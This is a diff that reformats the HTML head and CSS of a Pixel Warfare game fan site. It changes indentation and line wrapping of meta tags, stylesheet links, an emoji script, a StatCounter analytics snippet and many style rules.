@@ -1,859 +1,912 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta name="viewport" content="width=device-width">
-    <meta name="description" content="Pixel Warfare is a free to play online multiplayer 3D shoot 'em up game with old school graphics similar to Minecraft. Just download Unity Player, install it, and you're good to go.">
-    <meta name="keywords" content="pixel warfare, pixel warfare v2, pixel warfare 2, pixelwarfare, pixel warfare game">
-    <meta property="og:image" content="/WebPage/Pixel-warfare.jpg">
-    <meta name="generator" content="WordPress 5.4.8">
-    <title>Pixel Warfare</title>
 
-    <!-- Canonical & Feed Links -->
-    <link rel="canonical" href="/index.html">
-    <link rel="alternate" type="application/rss+xml" title="Pixel Warfare » Feed" href="https://pixelwarfareio.github.io/feed/">
-    <link rel="alternate" type="application/rss+xml" title="Pixel Warfare » Comments Feed" href="https://pixelwarfareio.github.io/comments/feed/">
-    <link rel="shortlink" href="/index.html">
-    <link rel="EditURI" type="application/rsd+xml" title="RSD" href="/WebPage/xmlrpc.php?rsd">
-    <link rel="wlwmanifest" type="application/wlwmanifest+xml" href="/WebPage/wlwmanifest.xml">
-    <!-- <link rel="https://api.w.org/" href="https://pixelwarfare.org/wp-json/"> -->
-    <link rel="alternate" type="application/json+oembed" href="/WebPage/oembed/1.0/embed?url=https://pixelwarfareio.github.io/">
-    <link rel="alternate" type="text/xml+oembed" href="/WebPage/oembed/1.0/embed?url=https://pixelwarfareio.github.io/&amp;format=xml">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width">
+  <meta name="description"
+    content="Pixel Warfare is a free to play online multiplayer 3D shoot 'em up game with old school graphics similar to Minecraft. Just download Unity Player, install it, and you're good to go.">
+  <meta name="keywords" content="pixel warfare, pixel warfare v2, pixel warfare 2, pixelwarfare, pixel warfare game">
+  <meta property="og:image" content="/WebPage/Pixel-warfare.jpg">
+  <meta name="generator" content="WordPress 5.4.8">
+  <title>Pixel Warfare</title>
 
-    <!-- Stylesheets -->
-    <link rel="stylesheet" href="/WebPage/PixelWarfare/style.css">
-    <link rel="stylesheet" id="wp-block-library-css" href="/WebPage/block-library/style.min.css">
-    <link rel="stylesheet" id="wpautoterms_css-css" href="/WebPage/auto-terms-of-service-and-privacy-policy/wpautoterms.css">
-    <link rel="stylesheet" id="contact-form-7-css" href="/WebPage/contact-form-7/styles.css">
-    <link rel="stylesheet" id="hupso_css-css" href="/WebPage/hupso-share-buttons-for-twitter-facebook-google/style.css">
-    <link rel="stylesheet" id="yasrcss-css" href="/WebPage/yet-another-stars-rating/yasr.css">
-    <link rel="stylesheet" id="yasrcsslightscheme-css" href="/WebPage/yet-another-stars-rating/yasr-table-light.css">
-    <link rel="stylesheet" id="dashicons-css" href="/WebPage/dashicons.min.css">
-    <link rel="stylesheet" id="olimpusMulti-css" href="/WebPage/PixelWarfare/style-print.css" media="print">
+  <!-- Canonical & Feed Links -->
+  <link rel="canonical" href="/index.html">
+  <link rel="alternate" type="application/rss+xml" title="Pixel Warfare » Feed"
+    href="https://pixelwarfareio.github.io/feed/">
+  <link rel="alternate" type="application/rss+xml" title="Pixel Warfare » Comments Feed"
+    href="https://pixelwarfareio.github.io/comments/feed/">
+  <link rel="shortlink" href="/index.html">
+  <link rel="EditURI" type="application/rsd+xml" title="RSD" href="/WebPage/xmlrpc.php?rsd">
+  <link rel="wlwmanifest" type="application/wlwmanifest+xml" href="/WebPage/wlwmanifest.xml">
+  <!-- <link rel="https://api.w.org/" href="https://pixelwarfare.org/wp-json/"> -->
+  <link rel="alternate" type="application/json+oembed"
+    href="/WebPage/oembed/1.0/embed?url=https://pixelwarfareio.github.io/">
+  <link rel="alternate" type="text/xml+oembed"
+    href="/WebPage/oembed/1.0/embed?url=https://pixelwarfareio.github.io/&amp;format=xml">
 
-    <!-- jQuery -->
-    <script src="/WebPage/jquery/jquery.js"></script>
-    <script src="/WebPage/jquery/jquery-migrate.min.js"></script>
+  <!-- Stylesheets -->
+  <link rel="stylesheet" href="/WebPage/PixelWarfare/style.css">
+  <link rel="stylesheet" id="wp-block-library-css" href="/WebPage/block-library/style.min.css">
+  <link rel="stylesheet" id="wpautoterms_css-css"
+    href="/WebPage/auto-terms-of-service-and-privacy-policy/wpautoterms.css">
+  <link rel="stylesheet" id="contact-form-7-css" href="/WebPage/contact-form-7/styles.css">
+  <link rel="stylesheet" id="hupso_css-css" href="/WebPage/hupso-share-buttons-for-twitter-facebook-google/style.css">
+  <link rel="stylesheet" id="yasrcss-css" href="/WebPage/yet-another-stars-rating/yasr.css">
+  <link rel="stylesheet" id="yasrcsslightscheme-css" href="/WebPage/yet-another-stars-rating/yasr-table-light.css">
+  <link rel="stylesheet" id="dashicons-css" href="/WebPage/dashicons.min.css">
+  <link rel="stylesheet" id="olimpusMulti-css" href="/WebPage/PixelWarfare/style-print.css" media="print">
 
-    <!-- Emoji Script -->
-    <script defer src="/WebPage/wp-emoji-release.min.js"></script>
-    <script>
-      window._wpemojiSettings = {
-        baseUrl: "https://s.w.org/images/core/emoji/12.0.0-1/72x72/",
-        ext: ".png",
-        svgUrl: "https://s.w.org/images/core/emoji/12.0.0-1/svg/",
-        svgExt: ".svg",
-        source: {
-          concatemoji: "/WebPage/wp-emoji-release.min.js"
-        }
-      };
-    </script>
+  <!-- jQuery -->
+  <script src="/WebPage/jquery/jquery.js"></script>
+  <script src="/WebPage/jquery/jquery-migrate.min.js"></script>
 
-    <!-- CSS from previous raw block (condensed version should be extracted to a separate CSS file ideally) -->
-    <style>
-      body { background-color: #000000; }
-      .custom-header-link img.header {
-        width: 100%;
-        max-width: 100%;
+  <!-- Emoji Script -->
+  <script defer src="/WebPage/wp-emoji-release.min.js"></script>
+  <script>
+    window._wpemojiSettings = {
+      baseUrl: "https://s.w.org/images/core/emoji/12.0.0-1/72x72/",
+      ext: ".png",
+      svgUrl: "https://s.w.org/images/core/emoji/12.0.0-1/svg/",
+      svgExt: ".svg",
+      source: {
+        concatemoji: "/WebPage/wp-emoji-release.min.js"
       }
-      /* Add other styles from the giant style block here (not repeated due to size) */
-    </style>
+    };
+  </script>
 
-    <!-- Emoji Image Styling -->
-    <style>
-      img.wp-smiley, img.emoji {
-        display: inline !important;
-        border: none !important;
-        box-shadow: none !important;
-        height: 1em !important;
-        width: 1em !important;
-        margin: 0 .07em !important;
-        vertical-align: -0.1em !important;
-        background: none !important;
-        padding: 0 !important;
-      }
-    </style>
+  <!-- CSS from previous raw block (condensed version should be extracted to a separate CSS file ideally) -->
+  <style>
+    body {
+      background-color: #000000;
+    }
 
-    <!-- StatCounter -->
-    <script type="text/javascript">
-      var sc_project=11006312; 
-      var sc_invisible=1; 
-      var sc_security="12b884be"; 
-      var scJsHost = (("https:" == document.location.protocol) ?
+    .custom-header-link img.header {
+      width: 100%;
+      max-width: 100%;
+    }
+
+    /* Add other styles from the giant style block here (not repeated due to size) */
+  </style>
+
+  <!-- Emoji Image Styling -->
+  <style>
+    img.wp-smiley,
+    img.emoji {
+      display: inline !important;
+      border: none !important;
+      box-shadow: none !important;
+      height: 1em !important;
+      width: 1em !important;
+      margin: 0 .07em !important;
+      vertical-align: -0.1em !important;
+      background: none !important;
+      padding: 0 !important;
+    }
+  </style>
+
+  <!-- StatCounter -->
+  <script type="text/javascript">
+    var sc_project = 11006312;
+    var sc_invisible = 1;
+    var sc_security = "12b884be";
+    var scJsHost = (("https:" == document.location.protocol) ?
       "https://secure." : "http://www.");
-      document.write("<sc"+"ript type='text/javascript' src='" +
-      scJsHost+
-      "statcounter.com/counter/counter.js'></"+"script>");
-    </script>
-
-    <style>
-      #game-frame {
-        width: 951;
-        height: 600;
-        border: none;
-      }
-      #fullscreen-btn {
-        position: absolute;
-        top: 20px;
-        right: 4px;
-        z-index: 9999;
-        background-color: rgba(0, 0, 0, 0.7);
-        color: white;
-        border: none;
-        padding: 7px;
-        font-size: 12px;
-        cursor: pointer;
-      }
-
-
-      .sidebar-column {
-        display: flex;
-        flex-direction: column;
-        align-items: stretch;
-        scale: 94%;
-        gap: 20px;
-        font-family: Arial, sans-serif;
-      }
-
-      .box {
-        background-color: #1e1e1e;
-        color: #fff;
-        border-radius: 10px;
-        padding: 15px;
-        text-align: center;
-        aspect-ratio: 1 / 1; /* makes it square */
-        display: flex;
-        flex-direction: column;
-        justify-content: space-between;
-        box-shadow: 0 0 10px rgba(0,0,0,0.3);
-      }
-
-      .box-title {
-        font-size: 18px;
-        font-weight: bold;
-        margin-bottom: 10px;
-      }
-
-      .clickable-image {
-        flex: 1;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-      }
-
-      .clickable-image a {
-        display: block;
-        width: 100%;
-        height: 100%;
-      }
-
-      .clickable-image img {
-        max-width: 80%;
-        max-height: 80%;
-        object-fit: contain;
-        border-radius: 8px;
-        transition: transform 0.2s ease;
-      }
-
-      .clickable-image img:hover {
-        transform: scale(1.05);
-      }
-
-      .yasr-star-rating {
-        width: 120px;
-        height: 24px;
-        background-size: 24px;
-        margin-bottom: 10px;
-        position: relative;
-      }
-
-      .yasr-star-value {
-        background-size: 24px;
-        width: 96%;
-        height: 100%;
-        background: gold;
-        position: absolute;
-        top: 0;
-        left: 0;
-      }
-
-      .yasr-visitor-votes-after-stars-class {
-        font-size: 14px;
-      }
-
-      .button-tile {
-        position: relative;
-        background-color: #2e2e2e;
-        border-radius: 10px;
-        overflow: hidden;
-        text-decoration: none;
-        color: #00afff;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        width: 200px;
-        height: 200px;
-        transition: transform 0.2s, background-color 0.2s;
-        cursor: pointer;
-        user-select: none;
-        font-size: 17px;
-        font-weight: bold;
-      }
-
-      .button-tile p {
-        margin: 5px 0;
-        padding: 0 5px;
-        font-size: 0.9em;
-        text-align: center;
-        color: white;
-        user-select: text;
-        font-weight: normal;
-      }
-      
-      .button-tile img {
-        width: 95%;
-        height: 80%;
-        object-fit: cover;
-        padding-top: 8px;
-        padding-left: 8px;
-        padding-right: 8px;
-        display: block;
-      }
-
-      .grid {
-        display: flex;
-        flex-wrap: wrap;
-        gap: 15px;
-        padding-right: 2px;
-        padding-top: 5px;
-        padding-bottom: 5px;
-        justify-content: flex-start;
-      }
-
-      /* Links and comments */
-      a:link,
-      a:visited,
-      div.entry a.more-link:link,
-      div.entry a.more-link:visited,
-      p.post-info-top span.number-of-comments,
-      p.post-info-top span.meta-info,
-      a.comments-closed:link,
-      a.comments-closed:visited {
-          color: #ff0000;
-      }
-
-      a:hover,
-      div.entry a.more-link:hover,
-      a.comments-closed:hover {
-          color: #00ff00;
-      }
-
-      /* Wrapper and layout */
-      div.wrapper,
-      div#wrapper {
-          width: 1180px;
-          margin-left: auto;
-          margin-right: auto;
-          margin-top: 0;
-          border-width: 5px;
-          border-color: #000000;
-      }
-
-      /* Primary taglines */
-      h1.primary-tagline-h1,
-      a.primary-tagline-link {
-          color: #ffffff;
-      }
-
-      /* Secondary taglines */
-      h2.secondary-tagline-h2,
-      a.secondary-tagline-link {
-          color: #ffffff;
-      }
-
-      /* Top navigation */
-      ul.top-navigation,
-      div.top-navigation {
-          background-color: #4b4848;
-      }
-
-      div.top-navigation {
-          border-top-color: #4b4848;
-          border-bottom-color: #4b4848;
-      }
-
-      div.top-navigation a,
-      small.nav_desc {
-          color: #ffffff;
-      }
-
-      div.top-navigation li:hover > a,
-      div.top-navigation a:focus {
-          color: #ff0000;
-      }
-
-      /* Submenu links */
-      ul.top-navigation li li a:link,
-      ul.top-navigation li li a:visited {
-          color: #3088b8;
-          background-color: #ffffff;
-          border-color: #a4d1ff;
-      }
-
-      ul.top-navigation li li a:hover {
-          color: #153c51;
-          background-color: #e8f3f9;
-          border-color: #a4d1ff;
-      }
-
-      ul.top-navigation li li a:active {
-          color: #3088b8;
-          background-color: #ffffff;
-          border-color: #a4d1ff;
-      }
-
-      /* Inner wrapper and content */
-      div.inner-wrapper,
-      div#inner-wrapper {
-          background-color: #000000;
-      }
-
-      div.header-container {
-          min-height: 0;
-      }
-
-      div#content,
-      div.content {
-          width: 973px;
-      }
-
-      /* Sidebar styles */
-      div.sidebar {
-        padding-top: 40px;
-      }
-
-      div.left-sidebar {
-          width: 207px;
-          background-color: #000000;
-      }
-
-      div.inner-wrapper div.long-left-sidebar-background,
-      div#inner-wrapper div.long-left-sidebar-background {
-          background-color: #000000;
-          width: 207px;
-          left: 0;
-      }
-
-      div.left-sidebar-item {
-          background-color: #000000;
-          border-color: #000000;
-          color: #ffffff;
-      }
-
-      div.left-sidebar table,
-      div.left-sidebar th,
-      div.left-sidebar tr,
-      div.left-sidebar td {
-          border-color: #ffffff;
-      }
-
-      div.left-sidebar-item ul li {
-          border-bottom-color: #000000;
-      }
-
-      div.left-sidebar-item h2.widgettitle,
-      div.left-sidebar-item h2.left-sidebar-item {
-          background-color: #000000;
-          color: #0b79b6;
-      }
-
-      div.left-sidebar-item a:link,
-      div.left-sidebar-item a:visited,
-      div.left-sidebar-item a.url:link,
-      div.left-sidebar-item a.url:visited {
-          color: #3fb7f8;
-      }
-
-      div.left-sidebar-item a:hover,
-      div.left-sidebar-item a.url:hover {
-          color: #065f8e;
-      }
-
-      /* Right sidebar styles */
-      div.right-sidebar {
-          width: 207px;
-          background-color: #000000;
-      }
-
-      div.inner-wrapper div.long-right-sidebar-background,
-      div#inner-wrapper div.long-right-sidebar-background {
-          background-color: #000000;
-          width: 207px;
-          right: 0;
-      }
-
-      div.right-sidebar-item {
-          background-color: #000000;
-          border-color: #000000;
-          color: #ffffff;
-      }
-
-      div.right-sidebar table,
-      div.right-sidebar th,
-      div.right-sidebar tr,
-      div.right-sidebar td {
-          border-color: #ffffff;
-      }
-
-      div.right-sidebar-item ul li {
-          border-bottom-color: #000000;
-      }
-
-      div.right-sidebar-item h2.widgettitle,
-      div.right-sidebar-item h2.right-sidebar-item {
-          background-color: #000000;
-          color: #0b79b6;
-      }
-
-      div.right-sidebar-item a:link,
-      div.right-sidebar-item a:visited,
-      div.right-sidebar-item a.url:link,
-      div.right-sidebar-item a.url:visited {
-          color: #3fb7f8;
-      }
-
-      div.right-sidebar-item a:hover,
-      div.right-sidebar-item a.url:hover {
-          color: #065f8e;
-      }
-
-      /* Various text styles */
-      h1.multiple-post-heading,
-      span.multiple-nav-left a,
-      span.multiple-nav-right a,
-      p.single-left,
-      p.single-right,
-      p.single-left a,
-      p.single-right a,
-      p.password-protected-comments,
-      h3.comment-reply-title,
-      h3.comment-reply-title a:link,
-      h3.comments,
-      a#cancel-comment-reply-link,
-      p.allowed-tags,
-      p.logged-in-as,
-      p.must-be-logged-in,
-      p.must-be-logged-in a,
-      a.logged-in-as,
-      a.log-out {
-          color: #3f3f3f;
-      }
-
-      /* Post titles and permalink */
-      h1.post-title,
-      h1.page-title,
-      h2.post-title,
-      a.permalink:link,
-      a.permalink:visited {
-          color: #ff0000;
-      }
-
-      a.permalink:hover {
-          color: #3f3f3f;
-      }
-
-      /* Post and page backgrounds */
-      div.post,
-      div.page,
-      div.attachment,
-      p.post-info-top,
-      div.inner-home-page-simple-textarea-content {
-          border-color: #000000;
-          background-color: #000000;
-          color: #ffffff;
-      }
-
-      div.entry table,
-      div.entry th,
-      div.entry tr,
-      div.entry td {
-          border-color: #ffffff;
-      }
-
-      .wp-caption-text,
-      span.comment-link {
-          color: #ffffff;
-      }
-
-      div.post,
-      div.page,
-      div.attachment {
-          margin-bottom: 30px;
-      }
-
-      div.sticky {
-          border-color: #000000;
-      }
-
-      /* Bottom navigation */
-      ul.bottom-navigation,
-      div.bottom-navigation {
-          background-color: #4b4848;
-      }
-
-      div.bottom-navigation {
-          border-top-color: #4b4848;
-          border-bottom-color: #4b4848;
-      }
-
-      div.bottom-navigation a,
-      small.nav_desc {
-          color: #ffffff;
-      }
-
-      div.bottom-navigation li:hover > a,
-      div.bottom-navigation a:focus {
-          color: #ff0000;
-      }
-
-      ul.bottom-navigation li li a:link,
-      ul.bottom-navigation li li a:visited {
-          color: #3088b8;
-          background-color: #c6f4fd;
-          border-color: #ffffff;
-      }
-
-      ul.bottom-navigation li li a:hover {
-          color: #3088b8;
-          background-color: #153c51;
-          border-color: #ffffff;
-      }
-
-      ul.bottom-navigation li li a:active {
-          color: #3088b8;
-          background-color: #ffffff;
-          border-color: #ffffff;
-      }
-
-      /* Footer */
-      div.footer {
-          background-color: #000000;
-      }
-
-      div.inner-footer-widget-container {
-          padding-left: 10px;
-          padding-right: 10px;
-      }
-
-      div.inner-footer table,
-      div.inner-footer th,
-      div.inner-footer tr,
-      div.inner-footer td {
-          border-color: #065f8e;
-      }
-
-      div.outer-footer-item {
-          width: 25%;
-      }
-
-      div.inner-footer-item {
-          background-color: #ffffff;
-          border-color: #ffffff;
-          color: #065f8e;
-          min-height: 270px;
-      }
-
-      div.inner-footer-item p.footer-latest-comments-excerpt {
-          color: #065f8e;
-      }
-
-      div.inner-footer-item ul li {
-          border-bottom-color: #ffffff;
-      }
-
-      div.inner-footer-item h2.footer-item,
-      div.inner-footer-item h2.widgettitle {
-          background-color: #b6e2fb;
-          color: #ffffff;
-      }
-
-      div.inner-footer-item a:link,
-      div.inner-footer-item a:visited {
-          color: #3fb7f8;
-      }
-
-      div.inner-footer-item a:hover {
-          color: #065f8e;
-      }
-
-      div.footer-spacer {
-          height: 20px;
-      }
-
-      /* Powered by / theme credits */
-      a.powered-by:link,
-      a.theme-created-by:link,
-      a.rss-all-posts:link,
-      a.rss-all-comments:link,
-      a.rss-comments-single-post:link,
-      a.designed-by:link,
-      a.powered-by:visited,
-      a.theme-created-by:visited,
-      a.rss-all-posts:visited,
-      a.rss-all-comments:visited,
-      a.rss-comments-single-post:visited,
-      a.designed-by:visited {
-          color: #256889;
-      }
-
-      span.image-rss {
-          border-color: #256889;
-      }
-
-      p.copyright,
-      span.theme-created-by,
-      a.powered-by:hover,
-      a.theme-created-by:hover,
-      a.rss-all-posts:hover,
-      a.rss-all-comments:hover,
-      a.rss-comments-single-post:hover,
-      a.designed-by:hover {
-          color: #ffffff;
-      }
-
-      /* Remove border-radius and shadows from many elements */
-      div.wrapper, div#wrapper, div.top-image-container, img.header,
-        img, div.entry img, div.inner-home-page img, div.inner-footer-item img, div.inner-home-page-widget img, div.sidebar img, img.avatar,
-        div.post, div.page, div.attachment, div.comment-body,
-        div.left-sidebar-item, h2.left-sidebar-item,  
-        div.right-sidebar-item, h2.right-sidebar-item, 
-        div.inner-footer-item, h2.footer-item,
-        div.inner-home-page-simple-textarea-content,
-        div.inner-home-page-widget, 
-        div.left-sidebar-item h2.widgettitle:first-child, 
-        div.right-sidebar-item h2.widgettitle:first-child, 
-        div.inner-footer-item h2.widgettitle:first-child, 
-        div.inner-home-page-widget h2.widgettitle:first-child,
-        div.footer, img.avatar, a.page-numbers:link, a.page-numbers:visited, a.page-numbers:hover
-      span.current {
-          border-radius: 0;
-          box-shadow: none;
-          -moz-border-radius: 0;
-          -moz-box-shadow: none;
-          -webkit-border-radius: 0;
-          -webkit-box-shadow: none;
-      }
-
-      /* Home page only styles */
-      body.home div.header-container {
-          min-height: 0;
-      }
-
-      div.outer-home-page {
-          margin-top: 0;
-      }
-
-      div.multiple-post-last-post,
-      div.multiple-excerpt-last-excerpt,
-      div.page {
-          margin-bottom: 0;
-      }
-
-      div.outer-home-page-simple {
-          padding-bottom: 0;
-      }
-
-      div.inner-home-page-simple,
-      div.front-page-content-no-sidebars,
-      div.post,
-      div.page,
-      div.single-post-navigation,
-      div.multiple-post-navigation {
-          margin-left: 0;
-          margin-right: 0;
-      }
-
-      div.inner-wrapper,
-      div.outer-home-page-simple {
-          background-color: #000000;
-      }
-
-      div.footer {
-          background-color: #000000;
-      }
-
-      div.inner-home-page-simple-textarea-content {
-          border-width: 0;
-      }
-
-      div.home-page-bottom-widget-spacer {
-          height: 20px;
-      }
-
-      div.outer-home-page-bottom-widget {
-          width: 33.33%;
-      }
-
-      div.home-page-widgets-container {
-          background-color: #5ec1f7;
-          padding-left: 10px;
-          padding-right: 10px;
-      }
-
-      div.inner-home-page-bottom-widget {
-          background-color: #ffffff;
-          border-color: #b6e2fb;
-          color: #065f8e;
-          min-height: 200px;
-      }
-
-      div.inner-home-page-bottom-widget h2.widgettitle {
-          background-color: #b6e2fb;
-          color: #ffffff;
-      }
-
-      div.inner-home-page-bottom-widget ul li {
-          border-bottom-color: #ffffff;
-      }
-
-      div.inner-home-page-bottom-widget table,
-      div.inner-home-page-bottom-widget th,
-      div.inner-home-page-bottom-widget tr,
-      div.inner-home-page-bottom-widget td {
-          border-color: #065f8e;
-      }
-
-      div.inner-home-page-bottom-widget a:link,
-      div.inner-home-page-bottom-widget a:visited {
-          color: #3fb7f8;
-      }
-
-      div.inner-home-page-bottom-widget a:hover {
-          color: #36b1f3;
-      }
-
-      div.inner-home-page-simple-01-textarea-01-content {
-          background-color: #ffffff;
-          min-height: 500px;
-          border-color: #ffffff;
-      }
-    </style>
-
-  </head>
-
-  <body class="custom-background">
-
-    <!-- Background Image -->
-    <style type="text/css" id="custom-background-css">
-      body.custom-background { 
-        background-image: url("/WebPage/Pixel-warfare-5.jpg"); 
-        background-position: center top; 
-        background-size: auto; 
-        background-repeat: repeat; 
-        background-attachment: scroll; 
-      }
-    </style>
-    <!-- Main Content -->
-    <!-- Add HTML above your website on all of your pages -->
-
-    <div class="wrapper">
-      <div class="top-image-container">
-        <a class="custom-header-link" href="/index.html">
-          <img class="header" src="/WebPage/Pixel-warfare.jpg" alt="header image">
-        </a>
-      </div>
-      <div class="top-navigation">
-        <ul id="menu-menu" class="top-navigation">
-          <li id="menu-item-12" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-10 current_page_item">
-            <a href="/index.html">Pixel Warfare</a>
-          </li>
-          <!-- <li id="menu-item-13" class="menu-item menu-item-type-post_type menu-item-object-page">
+    document.write("<sc" + "ript type='text/javascript' src='" +
+      scJsHost +
+      "statcounter.com/counter/counter.js'></" + "script>");
+  </script>
+
+  <style>
+    #game-frame {
+      width: 951;
+      height: 600;
+      border: none;
+    }
+
+    #fullscreen-btn {
+      position: absolute;
+      top: 20px;
+      right: 4px;
+      z-index: 9999;
+      background-color: rgba(0, 0, 0, 0.7);
+      color: white;
+      border: none;
+      padding: 7px;
+      font-size: 12px;
+      cursor: pointer;
+    }
+
+
+    .sidebar-column {
+      display: flex;
+      flex-direction: column;
+      align-items: stretch;
+      scale: 94%;
+      gap: 20px;
+      font-family: Arial, sans-serif;
+    }
+
+    .box {
+      background-color: #1e1e1e;
+      color: #fff;
+      border-radius: 10px;
+      padding: 15px;
+      text-align: center;
+      aspect-ratio: 1 / 1;
+      /* makes it square */
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+    }
+
+    .box-title {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .clickable-image {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .clickable-image a {
+      display: block;
+      width: 100%;
+      height: 100%;
+    }
+
+    .clickable-image img {
+      max-width: 80%;
+      max-height: 80%;
+      object-fit: contain;
+      border-radius: 8px;
+      transition: transform 0.2s ease;
+    }
+
+    .clickable-image img:hover {
+      transform: scale(1.05);
+    }
+
+    .yasr-star-rating {
+      width: 120px;
+      height: 24px;
+      background-size: 24px;
+      margin-bottom: 10px;
+      position: relative;
+    }
+
+    .yasr-star-value {
+      background-size: 24px;
+      width: 96%;
+      height: 100%;
+      background: gold;
+      position: absolute;
+      top: 0;
+      left: 0;
+    }
+
+    .yasr-visitor-votes-after-stars-class {
+      font-size: 14px;
+    }
+
+    .button-tile {
+      position: relative;
+      background-color: #2e2e2e;
+      border-radius: 10px;
+      overflow: hidden;
+      text-decoration: none;
+      color: #00afff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 200px;
+      height: 200px;
+      transition: transform 0.2s, background-color 0.2s;
+      cursor: pointer;
+      user-select: none;
+      font-size: 17px;
+      font-weight: bold;
+    }
+
+    .button-tile p {
+      margin: 5px 0;
+      padding: 0 5px;
+      font-size: 0.9em;
+      text-align: center;
+      color: white;
+      user-select: text;
+      font-weight: normal;
+    }
+
+    .button-tile img {
+      width: 95%;
+      height: 80%;
+      object-fit: cover;
+      padding-top: 8px;
+      padding-left: 8px;
+      padding-right: 8px;
+      display: block;
+    }
+
+    .grid {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 15px;
+      padding-right: 2px;
+      padding-top: 5px;
+      padding-bottom: 5px;
+      justify-content: flex-start;
+    }
+
+    /* Links and comments */
+    a:link,
+    a:visited,
+    div.entry a.more-link:link,
+    div.entry a.more-link:visited,
+    p.post-info-top span.number-of-comments,
+    p.post-info-top span.meta-info,
+    a.comments-closed:link,
+    a.comments-closed:visited {
+      color: #ff0000;
+    }
+
+    a:hover,
+    div.entry a.more-link:hover,
+    a.comments-closed:hover {
+      color: #00ff00;
+    }
+
+    /* Wrapper and layout */
+    div.wrapper,
+    div#wrapper {
+      width: 1180px;
+      margin-left: auto;
+      margin-right: auto;
+      margin-top: 0;
+      border-width: 5px;
+      border-color: #000000;
+    }
+
+    /* Primary taglines */
+    h1.primary-tagline-h1,
+    a.primary-tagline-link {
+      color: #ffffff;
+    }
+
+    /* Secondary taglines */
+    h2.secondary-tagline-h2,
+    a.secondary-tagline-link {
+      color: #ffffff;
+    }
+
+    /* Top navigation */
+    ul.top-navigation,
+    div.top-navigation {
+      background-color: #4b4848;
+    }
+
+    div.top-navigation {
+      border-top-color: #4b4848;
+      border-bottom-color: #4b4848;
+    }
+
+    div.top-navigation a,
+    small.nav_desc {
+      color: #ffffff;
+    }
+
+    div.top-navigation li:hover>a,
+    div.top-navigation a:focus {
+      color: #ff0000;
+    }
+
+    /* Submenu links */
+    ul.top-navigation li li a:link,
+    ul.top-navigation li li a:visited {
+      color: #3088b8;
+      background-color: #ffffff;
+      border-color: #a4d1ff;
+    }
+
+    ul.top-navigation li li a:hover {
+      color: #153c51;
+      background-color: #e8f3f9;
+      border-color: #a4d1ff;
+    }
+
+    ul.top-navigation li li a:active {
+      color: #3088b8;
+      background-color: #ffffff;
+      border-color: #a4d1ff;
+    }
+
+    /* Inner wrapper and content */
+    div.inner-wrapper,
+    div#inner-wrapper {
+      background-color: #000000;
+    }
+
+    div.header-container {
+      min-height: 0;
+    }
+
+    div#content,
+    div.content {
+      width: 973px;
+    }
+
+    /* Sidebar styles */
+    div.sidebar {
+      padding-top: 40px;
+    }
+
+    div.left-sidebar {
+      width: 207px;
+      background-color: #000000;
+    }
+
+    div.inner-wrapper div.long-left-sidebar-background,
+    div#inner-wrapper div.long-left-sidebar-background {
+      background-color: #000000;
+      width: 207px;
+      left: 0;
+    }
+
+    div.left-sidebar-item {
+      background-color: #000000;
+      border-color: #000000;
+      color: #ffffff;
+    }
+
+    div.left-sidebar table,
+    div.left-sidebar th,
+    div.left-sidebar tr,
+    div.left-sidebar td {
+      border-color: #ffffff;
+    }
+
+    div.left-sidebar-item ul li {
+      border-bottom-color: #000000;
+    }
+
+    div.left-sidebar-item h2.widgettitle,
+    div.left-sidebar-item h2.left-sidebar-item {
+      background-color: #000000;
+      color: #0b79b6;
+    }
+
+    div.left-sidebar-item a:link,
+    div.left-sidebar-item a:visited,
+    div.left-sidebar-item a.url:link,
+    div.left-sidebar-item a.url:visited {
+      color: #3fb7f8;
+    }
+
+    div.left-sidebar-item a:hover,
+    div.left-sidebar-item a.url:hover {
+      color: #065f8e;
+    }
+
+    /* Right sidebar styles */
+    div.right-sidebar {
+      width: 207px;
+      background-color: #000000;
+    }
+
+    div.inner-wrapper div.long-right-sidebar-background,
+    div#inner-wrapper div.long-right-sidebar-background {
+      background-color: #000000;
+      width: 207px;
+      right: 0;
+    }
+
+    div.right-sidebar-item {
+      background-color: #000000;
+      border-color: #000000;
+      color: #ffffff;
+    }
+
+    div.right-sidebar table,
+    div.right-sidebar th,
+    div.right-sidebar tr,
+    div.right-sidebar td {
+      border-color: #ffffff;
+    }
+
+    div.right-sidebar-item ul li {
+      border-bottom-color: #000000;
+    }
+
+    div.right-sidebar-item h2.widgettitle,
+    div.right-sidebar-item h2.right-sidebar-item {
+      background-color: #000000;
+      color: #0b79b6;
+    }
+
+    div.right-sidebar-item a:link,
+    div.right-sidebar-item a:visited,
+    div.right-sidebar-item a.url:link,
+    div.right-sidebar-item a.url:visited {
+      color: #3fb7f8;
+    }
+
+    div.right-sidebar-item a:hover,
+    div.right-sidebar-item a.url:hover {
+      color: #065f8e;
+    }
+
+    /* Various text styles */
+    h1.multiple-post-heading,
+    span.multiple-nav-left a,
+    span.multiple-nav-right a,
+    p.single-left,
+    p.single-right,
+    p.single-left a,
+    p.single-right a,
+    p.password-protected-comments,
+    h3.comment-reply-title,
+    h3.comment-reply-title a:link,
+    h3.comments,
+    a#cancel-comment-reply-link,
+    p.allowed-tags,
+    p.logged-in-as,
+    p.must-be-logged-in,
+    p.must-be-logged-in a,
+    a.logged-in-as,
+    a.log-out {
+      color: #3f3f3f;
+    }
+
+    /* Post titles and permalink */
+    h1.post-title,
+    h1.page-title,
+    h2.post-title,
+    a.permalink:link,
+    a.permalink:visited {
+      color: #ff0000;
+    }
+
+    a.permalink:hover {
+      color: #3f3f3f;
+    }
+
+    /* Post and page backgrounds */
+    div.post,
+    div.page,
+    div.attachment,
+    p.post-info-top,
+    div.inner-home-page-simple-textarea-content {
+      border-color: #000000;
+      background-color: #000000;
+      color: #ffffff;
+    }
+
+    div.entry table,
+    div.entry th,
